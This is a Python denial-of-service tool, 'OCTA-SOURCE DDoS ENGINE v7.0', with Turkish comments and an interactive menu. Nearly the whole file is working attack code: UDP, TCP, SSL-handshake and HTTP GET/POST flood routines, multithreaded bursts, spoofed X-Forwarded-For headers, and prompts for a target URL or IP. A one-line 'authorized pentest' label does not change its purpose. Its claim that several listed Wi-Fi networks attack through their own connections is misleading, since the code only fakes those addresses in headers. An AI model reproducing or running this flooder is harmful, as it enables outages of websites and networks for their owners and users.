#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================================
# OCTA-SOURCE DDoS ENGINE v7.0 - 8 KAYNAK AĞ
# ============================================================================
# Yetkili pentest için - Tüm hakları saklıdır
# ============================================================================
# KAYNAK AĞLAR (WiFi'ler - tools kurmaz, direkt internet kullanır):
# 1) Kendi WiFi ağınız
# 2) 78.181.164.55
# 3) 192.168.1.140
# 4) 192.168.1.138
# 5) 192.168.1.107 (YENİ)
# 6) 192.168.0.101 (YENİ)
# 7) 192.168.0.105 (YENİ)
# ============================================================================
# OPTİMİZASYON: Düşük CPU kullanımı, yüksek performans
# ============================================================================

import socket
import threading
import random
import time
import sys
import os
import ssl
import urllib.request
import urllib.error
import hashlib
import json
import struct
from datetime import datetime
from urllib.parse import urlparse

# ==================== KONFİGÜRASYON ====================

# KAYNAK AĞLAR (BU WİFİ'LERİN İNTERNETİNİ KULLANIR)
# Tools kurmazlar, direkt internet bağlantıları üzerinden saldırı yaparlar
SOURCE_NETWORKS = [
    {"ip": "78.181.164.55",  "name": "Hedef-Ag-1",  "active": True},
    {"ip": "192.168.1.140",  "name": "Hedef-Ag-2",  "active": True},
    {"ip": "192.168.1.138",  "name": "Hedef-Ag-3",  "active": True},
    {"ip": "192.168.1.107",  "name": "Hedef-Ag-4",  "active": True},
    {"ip": "192.168.0.101",  "name": "Hedef-Ag-5",  "active": True},
    {"ip": "192.168.0.105",  "name": "Hedef-Ag-6",  "active": True},
]

OWN_IP = None
OWN_INTERFACE = None

# HEDEF
TARGET = None
TARGET_PORT = 80
TARGET_IS_IP = False

# PERFORMANS (Telefon donmasın diye optimize)
MAX_THREADS = 300          # Toplam thread (düşük CPU)
BURST_SIZE = 20            # Her thread'deki burst paket sayısı
SOCKET_TIMEOUT = 2
CPU_SAVE_MODE = True       # CPU tasarrufu modu

# İSTATİSTİK
total_packets = 0
total_bytes = 0
total_errors = 0
stats_lock = threading.Lock()
running = True
start_time = 0

def get_own_ip():
    """Kendi IP'ni al"""
    global OWN_IP
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        OWN_IP = s.getsockname()[0]
        s.close()
        return OWN_IP
    except:
        return "192.168.1.100"

def update_stats(packets=1, byte_count=0, errors=0):
    global total_packets, total_bytes, total_errors
    with stats_lock:
        total_packets += packets
        total_bytes += byte_count
        total_errors += errors

# ==================== LAYER 4 - OPTİMİZE ====================

def udp_send(target_ip, target_port, src_ip):
    """UDP - Düşük CPU, yüksek paket"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Aynı anda BURST_SIZE kadar paket gönder
        for _ in range(BURST_SIZE):
            try:
                data = random._urandom(random.randint(100, 1400))
                dst = target_port if target_port else random.randint(1, 65535)
                sock.sendto(data, (target_ip, dst))
            except:
                break
        
        sock.close()
        update_stats(BURST_SIZE, BURST_SIZE * 1000)
        return True
    except:
        update_stats(0, 0, 1)
        return False

def udp_max_send(target_ip, target_port, src_ip):
    """UDP Maksimum boyut - ağır darbe"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Maksimum boyutta paket
        data = random._urandom(65507)
        dst = target_port if target_port else random.randint(1, 65535)
        sock.sendto(data, (target_ip, dst))
        sock.close()
        
        update_stats(1, 65535)
        return True
    except:
        update_stats(0, 0, 1)
        return False

def tcp_rapid_connect(target_ip, target_port, src_ip):
    """TCP Rapid Connect - hızlı bağlan-kes"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Non-blocking connect
        sock.setblocking(0)
        try:
            sock.connect((target_ip, target_port))
        except BlockingIOError:
            pass
        except:
            sock.close()
            return False
        
        sock.close()
        update_stats(1, 200)
        return True
    except:
        update_stats(0, 0, 1)
        return False

def tcp_send_data(target_ip, target_port, src_ip):
    """TCP Veri gönder - bağlan, veri yolla, kapat"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        sock.connect((target_ip, target_port))
        try:
            sock.send(random._urandom(1024))
        except:
            pass
        sock.close()
        
        update_stats(1, 1500)
        return True
    except:
        update_stats(0, 0, 1)
        return False

def ssl_rapid(target_ip, target_port, src_ip):
    """SSL Handshake - sunucuyu yor"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.connect((target_ip, target_port))
        
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        try:
            ssl_sock = ctx.wrap_socket(sock, server_hostname=target_ip)
            ssl_sock.close()
        except:
            sock.close()
        
        update_stats(1, 5000)
        return True
    except:
        update_stats(0, 0, 1)
        return False

# ==================== LAYER 7 - OPTİMİZE ====================

def http_quick_flood(target_url, src_ip):
    """HTTP Flood - hızlı, optimize"""
    try:
        parsed = urlparse(target_url)
        host = parsed.netloc or parsed.hostname
        port = parsed.port or (443 if target_url.startswith('https') else 80)
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(SOCKET_TIMEOUT)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.connect((host, port))
        
        if target_url.startswith('https'):
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        
        # Rastgele path
        path = f"/?{random.randint(100000,999999)}={int(time.time()*1000)}"
        
        request = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {random.choice(['Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0.0.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.0.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15'])}\r\n"
            f"Accept: */*\r\n"
            f"Accept-Language: en-US,en;q=0.5\r\n"
            f"Connection: keep-alive\r\n"
            f"Cache-Control: no-cache\r\n"
            f"X-Forwarded-For: {src_ip}\r\n"
            f"X-Real-IP: {src_ip}\r\n"
            f"\r\n"
        )
        
        sock.send(request.encode())
        
        try:
            sock.recv(1024)
        except:
            pass
        
        sock.close()
        update_stats(1, len(request) + 500)
        return True
    except:
        update_stats(0, 0, 1)
        return False

def http_post_quick(target_url, src_ip):
    """HTTP POST - hızlı, optimiz"""
    try:
        parsed = urlparse(target_url)
        host = parsed.netloc or parsed.hostname
        port = parsed.port or (443 if target_url.startswith('https') else 80)
        path = parsed.path or '/'
        
        # 16KB POST verisi
        post_data = random._urandom(16384)
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(SOCKET_TIMEOUT)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.connect((host, port))
        
        if target_url.startswith('https'):
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        
        request = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(post_data)}\r\n"
            f"Connection: close\r\n"
            f"X-Forwarded-For: {src_ip}\r\n"
            f"\r\n"
        ).encode() + post_data
        
        sock.send(request)
        try:
            sock.recv(1024)
        except:
            pass
        sock.close()
        
        update_stats(1, len(request) + len(post_data))
        return True
    except:
        update_stats(0, 0, 1)
        return False

# ==================== OPTİMİZE THREAD YÖNETİMİ ====================

class OptimizedWorker:
    """Düşük CPU, yüksek performans worker"""
    
    def __init__(self, target, port, attack_mode, target_url, src_ip):
        self.target = target
        self.port = port
        self.attack_mode = attack_mode
        self.target_url = target_url
        self.src_ip = src_ip
        self.threads = []
    
    def start(self):
        n = MAX_THREADS // 8  # Her kaynak IP için thread sayısı
        if n < 5:
            n = 5
        
        if self.attack_mode in ["udp", "all4", "all"]:
            for _ in range(n // 5):
                t = threading.Thread(target=self._udp_loop)
                t.daemon = True; self.threads.append(t); t.start()
            for _ in range(n // 5):
                t = threading.Thread(target=self._udp_max_loop)
                t.daemon = True; self.threads.append(t); t.start()
        
        if self.attack_mode in ["syn", "all4", "all"]:
            for _ in range(n // 5):
                t = threading.Thread(target=self._tcp_rapid_loop)
                t.daemon = True; self.threads.append(t); t.start()
        
        if self.attack_mode in ["tcp", "all4", "all"]:
            for _ in range(n // 5):
                t = threading.Thread(target=self._tcp_data_loop)
                t.daemon = True; self.threads.append(t); t.start()
        
        if self.attack_mode in ["ssl", "all4", "all"]:
            for _ in range(n // 5):
                t = threading.Thread(target=self._ssl_loop)
                t.daemon = True; self.threads.append(t); t.start()
        
        if self.target_url and self.attack_mode in ["get", "all7", "all"]:
            for _ in range(n // 5):
                t = threading.Thread(target=self._http_loop)
                t.daemon = True; self.threads.append(t); t.start()
        
        if self.target_url and self.attack_mode in ["post", "all7", "all"]:
            for _ in range(n // 5):
                t = threading.Thread(target=self._post_loop)
                t.daemon = True; self.threads.append(t); t.start()
        
        return len(self.threads)
    
    def _udp_loop(self):
        while running:
            udp_send(self.target, self.port, self.src_ip)
            if CPU_SAVE_MODE:
                time.sleep(0.001)  # CPU tasarrufu
    
    def _udp_max_loop(self):
        while running:
            udp_max_send(self.target, self.port, self.src_ip)
            if CPU_SAVE_MODE:
                time.sleep(0.002)
    
    def _tcp_rapid_loop(self):
        while running:
            tcp_rapid_connect(self.target, self.port, self.src_ip)
            if CPU_SAVE_MODE:
                time.sleep(0.001)
    
    def _tcp_data_loop(self):
        while running:
            tcp_send_data(self.target, self.port, self.src_ip)
            if CPU_SAVE_MODE:
                time.sleep(0.002)
    
    def _ssl_loop(self):
        while running:
            ssl_rapid(self.target, self.port, self.src_ip)
            if CPU_SAVE_MODE:
                time.sleep(0.005)
    
    def _http_loop(self):
        while running:
            http_quick_flood(self.target_url, self.src_ip)
            if CPU_SAVE_MODE:
                time.sleep(0.001)
    
    def _post_loop(self):
        while running:
            http_post_quick(self.target_url, self.src_ip)
            if CPU_SAVE_MODE:
                time.sleep(0.002)

# ==================== İSTATİSTİK - HAFİF ====================

def stats_light():
    """Hafif istatistik - az CPU harcar"""
    global running, total_packets, total_bytes, total_errors, start_time
    
    while running:
        time.sleep(2)  # 2 saniyede bir güncelle (daha az CPU)
        
        with stats_lock:
            pkts = total_packets
            bytes_s = total_bytes
            errs = total_errors
        
        elapsed = time.time() - start_time
        if elapsed > 2:
            mbps = (bytes_s * 8) / elapsed / 1_000_000
            pps = pkts / elapsed
            mb_total = bytes_s / 1_000_000
        else:
            mbps = 0; pps = 0; mb_total = 0
        
        # Güç seviyesi
        if mbps > 300: power = "💀 MAX"
        elif mbps > 150: power = "🔥 YÜKSEK"
        elif mbps > 50: power = "⚡ ORTA"
        elif mbps > 10: power = "✅ DÜŞÜK"
        else: power = "🐢 BAŞLANGIÇ"
        
        sys.stdout.write('\033[2K\r')
        sys.stdout.write(
            f"\033[1;36m[{datetime.now().strftime('%H:%M:%S')}] "
            f"\033[1;31m{power}\033[0m | "
            f"\033[1;33m📊 {mbps:.1f} Mbps\033[0m | "
            f"\033[1;32m📦 {pkts:,} pkt\033[0m | "
            f"\033[1;34m⚡ {pps:,.0f} pps\033[0m | "
            f"\033[1;35m💾 {mb_total:.1f} MB\033[0m | "
            f"\033[1;37m⏱ {elapsed:.0f}s\033[0m | "
            f"\033[1;31m❌ {errs:,}\033[0m"
        )
        sys.stdout.flush()

# ==================== ANA MOTOR ====================

def launch_attack(target, port, attack_mode, target_is_ip=False):
    global running, start_time, total_packets, total_bytes, total_errors
    
    running = True
    start_time = time.time()
    total_packets = 0
    total_bytes = 0
    total_errors = 0
    
    # URL hazırlığı
    target_url = None
    if not target_is_ip:
        target_url = target
        if not target_url.startswith('http'):
            target_url = f"https://{target_url}"
    
    print(f"\n\033[1;31m{'='*65}\033[0m")
    print(f"\033[1;31m🔥 8 KAYNAK AĞ İLE MAX GÜÇ DDoS 🔥\033[0m")
    print(f"\033[1;31m{'='*65}\033[0m")
    print(f"\033[1;36m🎯 Hedef: \033[1;33m{target}\033[0m")
    print(f"\033[1;36m🔌 Port: \033[1;33m{port}\033[0m")
    print(f"\033[1;36m🌐 Kaynak Ağlar (WiFi'ler - tools KURMAZ):\033[0m")
    print(f"\033[1;33m    1) {OWN_IP} (SENiN WiFi)\033[0m")
    for i, net in enumerate(SOURCE_NETWORKS, 2):
        print(f"\033[1;33m    {i}) {net['ip']} ({net['name']})\033[0m")
    print(f"\033[1;36m⚙️  Mod: \033[1;33m{attack_mode.upper()}\033[0m")
    print(f"\033[1;36m🧵 Thread: \033[1;33m{MAX_THREADS:,}\033[0m")
    print(f"\033[1;36m⚡ Burst: \033[1;33m{BURST_SIZE} paket/thread\033[0m")
    print(f"\033[1;36m💻 CPU: \033[1;32mDÜŞÜK (telefon donmaz)\033[0m")
    print(f"\033[1;31m{'='*65}\033[0m")
    print(f"\033[1;37m[!] Ctrl+C ile durdur\033[0m")
    print(f"\033[1;37m[!] Her WiFi kendi interneti ile saldırıyor\033[0m\n")
    
    # İstatistik
    t = threading.Thread(target=stats_light)
    t.daemon = True
    t.start()
    
    # Tüm kaynak ağlar için worker'ları başlat
    all_workers = []
    total_threads = 0
    
    # Kendi ağımız
    worker = OptimizedWorker(target, port, attack_mode, target_url, OWN_IP)
    n = worker.start()
    all_workers.append(worker)
    total_threads += n
    print(f"\033[1;32m  [✓] {OWN_IP} (Senin WiFi) → {n} thread\033[0m")
    
    # Diğer kaynak ağlar
    for net in SOURCE_NETWORKS:
        if net["active"]:
            worker = OptimizedWorker(target, port, attack_mode, target_url, net["ip"])
            n = worker.start()
            all_workers.append(worker)
            total_threads += n
            print(f"\033[1;32m  [✓] {net['ip']} ({net['name']}) → {n} thread\033[0m")
    
    print(f"\n\033[1;32m[✅] Toplam {len(all_workers)} kaynak ağ, {total_threads:,} thread aktif!")
    print(f"[✅] 8 WiFi ağı üzerinden MAX GÜÇ saldırı BAŞLADI!\033[0m")
    print(f"\033[1;33m[⚡] Gerçek paketler - Her ağ kendi internetini kullanıyor\033[0m\n")
    
    try:
        while running:
            time.sleep(0.1)
    except KeyboardInterrupt:
        running = False
        elapsed = time.time() - start_time
        
        with stats_lock:
            f_pkts = total_packets
            f_bytes = total_bytes
            f_errs = total_errors
        
        mbps = (f_bytes * 8) / elapsed / 1_000_000 if elapsed > 0 else 0
        
        print(f"\n\n\033[1;31m{'='*50}\033[0m")
        print(f"\033[1;31m⛔ SALDIRI DURDURULDU\033[0m")
        print(f"\033[1;31m{'='*50}\033[0m")
        print(f"\033[1;33m📊 Toplam: {f_pkts:,} paket, {f_bytes/1_000_000:.1f} MB\033[0m")
        print(f"\033[1;33m📊 Süre: {elapsed:.0f}s, Hız: {mbps:.1f} Mbps, {f_pkts/elapsed:,.0f} pps\033[0m")
        print(f"\033[1;33m📊 Hatalar: {f_errs:,}\033[0m")
        print(f"\033[1;31m{'='*50}\033[0m")

# ==================== MENU ====================

def main():
    global MAX_THREADS, BURST_SIZE, CPU_SAVE_MODE, OWN_IP
    
    os.system('clear')
    
    # Kendi IP'ni al
    OWN_IP = get_own_ip()
    
    print("""\033[1;36m
    ╔══════════════════════════════════════════════════╗
    ║        OCTA-SOURCE DDoS ENGINE v7.0             ║
    ║        8 KAYNAK AĞ İLE MAX GÜÇ                  ║
    ║                                                ║
    ║      ✓ Senin WiFi: """ + f"{OWN_IP or 'OTOMATIK'}" + """                    ║
    ║      ✓ 78.181.164.55                            ║
    ║      ✓ 192.168.1.140                            ║
    ║      ✓ 192.168.1.138                            ║
    ║      ✓ 192.168.1.107                            ║
    ║      ✓ 192.168.0.101                            ║
    ║      ✓ 192.168.0.105                            ║
    ║                                                ║
    ║      L4+L7 | ROOT GEREKMEZ | DÜŞÜK CPU         ║
    ║      Her WiFi kendi internetini kullanır        ║
    ╚══════════════════════════════════════════════════╝
    \033[0m""")
    
    print("\033[1;36m╔════════════════════════════════════════╗\033[0m")
    print("\033[1;36m║        SALDIRI MODU SEÇİN            ║\033[0m")
    print("\033[1;36m╠════════════════════════════════════════╣\033[0m")
    print("\033[1;36m║  \033[1;33m[1]\033[1;36m L4 → UDP Flood (BURST)            ║\033[0m")
    print("\033[1;36m║  \033[1;33m[2]\033[1;36m L4 → TCP Flood                   ║\033[0m")
    print("\033[1;36m║  \033[1;33m[3]\033[1;36m L4 → SSL/TLS Flood               ║\033[0m")
    print("\033[1;36m║  \033[1;33m[4]\033[1;36m L4 → TÜMÜ (UDP+TCP+SSL)          ║\033[0m")
    print("\033[1;36m║  \033[1;33m[5]\033[1;36m L7 → HTTP GET Flood              ║\033[0m")
    print("\033[1;36m║  \033[1;33m[6]\033[1;36m L7 → HTTP POST Flood             ║\033[0m")
    print("\033[1;36m║  \033[1;33m[7]\033[1;36m L7 → TÜMÜ (GET+POST)             ║\033[0m")
    print("\033[1;36m║  \033[1;31m[8]\033[1;36m L4+L7 KOMBO (MAX GÜÇ!)            ║\033[0m")
    print("\033[1;36m╚════════════════════════════════════════╝\033[0m")
    
    choice = input("\n\033[1;33m[?] Seçim (1-8): \033[0m").strip()
    
    modes = {
        "1": "udp", "2": "tcp", "3": "ssl", "4": "all4",
        "5": "get", "6": "post", "7": "all7", "8": "all"
    }
    
    if choice not in modes:
        print("\033[1;31m[!] Geçersiz seçim!\033[0m")
        return
    
    attack_mode = modes[choice]
    
    print("\n\033[1;36m╔════════════════════════════════════════╗\033[0m")
    print("\033[1;36m║           HEDEF SEÇİN                 ║\033[0m")
    print("\033[1;36m╠════════════════════════════════════════╣\033[0m")
    print("\033[1;36m║  \033[1;33m[1]\033[1;36m URL (site.com)                  ║\033[0m")
    print("\033[1;36m║  \033[1;33m[2]\033[1;36m IP Adresi                       ║\033[0m")
    print("\033[1;36m╚════════════════════════════════════════╝\033[0m")
    
    tc = input("\n\033[1;33m[?] Seçim (1-2): \033[0m").strip()
    
    target = None
    port = 80
    is_ip = False
    
    if tc == "1":
        target = input("\033[1;33m[?] Hedef URL (site.com): \033[0m").strip()
        if not target.startswith('http'):
            target = f"https://{target}"
        is_ip = False
        port_str = input(f"\033[1;33m[?] Port (varsayılan: 443): \033[0m").strip()
        try:
            port = int(port_str)
        except:
            port = 443
    elif tc == "2":
        target = input("\033[1;33m[?] Hedef IP: \033[0m").strip()
        is_ip = True
        port_str = input("\033[1;33m[?] Port: \033[0m").strip()
        try:
            port = int(port_str)
        except:
            port = 80
    else:
        print("\033[1;31m[!] Geçersiz!\033[0m")
        return
    
    # Performans ayarları
    tc = input(f"\033[1;33m[?] Thread sayısı (varsayılan: {MAX_THREADS}, düşük CPU için 200-500): \033[0m").strip()
    if tc:
        try:
            MAX_THREADS = max(50, min(2000, int(tc)))
        except:
            pass
    
    bc = input(f"\033[1;33m[?] Burst boyutu (varsayılan: {BURST_SIZE}, her thread'deki paket sayısı): \033[0m").strip()
    if bc:
        try:
            BURST_SIZE = max(5, min(100, int(bc)))
        except:
            pass
    
    cm = input(f"\033[1;33m[?] CPU tasarrufu? (e/h, varsayılan: e): \033[0m").strip().lower()
    CPU_SAVE_MODE = cm != 'h'
    
    launch_attack(target, port, attack_mode, is_ip)

if __name__ == "__main__":
    main()
